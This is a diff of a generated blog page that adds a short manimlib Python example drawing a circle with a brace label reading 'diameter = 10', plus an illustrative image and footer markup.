+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> manimlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">       circle=Circle()</span><br><span class="line">       <span class="variable language_">self</span>.play(Write(circle))</span><br><span class="line">       bt=BraceText(</span><br><span class="line">            obj=circle,</span><br><span class="line">            text=<span class="string">&quot;直径$=10$&quot;</span>,</span><br><span class="line">            brace_direction=UP</span><br><span class="line">       )</span><br><span class="line">       <span class="variable language_">self</span>.play(Write(bt))</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220909111120584.png"
+alt="image-20220909111120584" />
+<figcaption aria-hidden="true">image-20220909111120584</figcaption>
+</figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
   <nav class="pagination">
@@ -4359,7 +4402,7 @@ alt="image-20220910231722908" />
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">36</span>
+        <span class="site-state-item-count">35</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
